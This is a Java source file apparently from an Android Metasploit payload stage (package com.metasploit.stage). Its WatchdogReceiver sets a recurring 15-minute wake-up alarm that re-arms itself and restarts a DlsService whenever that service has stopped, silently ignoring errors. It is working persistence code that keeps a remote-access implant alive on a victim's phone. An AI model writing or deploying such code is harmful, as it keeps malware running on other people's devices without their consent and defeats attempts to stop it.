package com.metasploit.stage;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * AlarmManager watchdog receiver — fires every 15 minutes (set by DlsService).
 * Checks if DlsService is running; if not, restarts it.
 * Also re-arms itself for the next fire.
 */
public class WatchdogReceiver extends BroadcastReceiver {
    static final String ACTION = "com.metasploit.stage.WATCHDOG_FIRE";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || !ACTION.equals(intent.getAction())) return;

        // Re-arm the watchdog for next fire
        rearm(context);

        // Check if service is alive; if not, start it
        if (!isServiceRunning(context)) {
            BootReceiver.launch(context);
        }
    }

    static boolean isServiceRunning(Context ctx) {
        android.app.ActivityManager am =
            (android.app.ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
        if (am == null) return false;
        for (android.app.ActivityManager.RunningServiceInfo s : am.getRunningServices(256)) {
            if (DlsService.class.getName().equals(s.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    static void rearm(Context ctx) {
        try {
            android.app.AlarmManager am =
                (android.app.AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            Intent i = new Intent(ctx, WatchdogReceiver.class);
            i.setAction(ACTION);
            android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(
                ctx, 0, i,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
            long interval = 15 * 60 * 1000L;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(
                    android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    android.os.SystemClock.elapsedRealtime() + interval, pi);
            } else {
                am.set(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    android.os.SystemClock.elapsedRealtime() + interval, pi);
            }
        } catch (Exception ignored) {}
    }
}
